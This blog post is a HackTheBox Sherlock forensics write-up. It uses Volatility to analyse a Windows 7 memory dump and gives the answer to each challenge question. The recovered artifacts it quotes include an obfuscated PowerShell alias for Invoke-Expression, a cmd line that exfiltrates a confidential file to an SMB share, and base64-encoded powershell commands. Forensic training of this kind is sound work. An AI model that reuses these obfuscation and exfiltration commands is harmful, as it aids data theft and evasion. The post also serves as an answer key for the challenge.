---
layout: post
date: 07-05-2024
author: Julio
---

<div class="center"><img src="https://labs.hackthebox.com/storage/challenges/605ff764c617d3cd28dbbdd72be8f9a2.png" width="350"></div>

# Recollection Write-Up

## Introduction

<p>Recollection is an "Easy" sherlock challenge on HackTheBox. This is the scenario: "A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below."</p>
<p>We start with a file called recollection.zip and we unzip it to get recollection.bin</p>

## Questions

### What is the Operating System of the machine?

<p>Judging my the scenario description, we are dealing with a memory dump. We can use a tool called "Volatility" to interact with it - we will be using both its version 2 and version 3. Assuming the memory dump was taken from a Windows machine, we can run the following command to get more information on the system:</p>

```bash
python3 vol.py -f ../recollection.bin windows.info
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished
Variable	Value

Kernel Base	0xf8000285c000
DTB	0x187000
Symbols	file:///Users/julio/Downloads/Recollection/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80002a3f120
NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
CSDVersion	1
KdVersionBlock	0xf80002a3f0e8
Major/Minor	15.7601
MachineType	34404
KeNumberProcessors	1
SystemTime	2022-12-19 16:07:30
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	6
NtMinorVersion	1
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	1
PE Machine	34404
PE TimeDateStamp	Thu Aug  2 02:18:10 2018
```

<p>We can see <custom-code>NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_</custom-code>, which indicates that the right answer is <custom-code>Windows 7</custom-code>.</p>

### When was the memory dump created?

<p>The previous command also answers this one. The dump time is the system time. The right answer is <custom-code>2022-12-19 16:07:30</custom-code>.</p>

### After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

<p>We can use Volatility 2 to retrieve the contents of the clipboard</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

<p>The right answer is <custom-code>(gv '*MDR*').naMe[3,11,2]-joIN''</custom-code>.</p>

### The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

<p>We can run the following command to get more information on the console history.</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
[...snip]
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user>
```

<p><custom-code>iex</custom-code> corresponds to <custom-code>Invoke-Expression</custom-code>, which is the right answer.</p>

### A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

<p>The same command executed above will iive us the answer:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
```

<p>The right answer is <custom-code>type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt</custom-code>.</p>
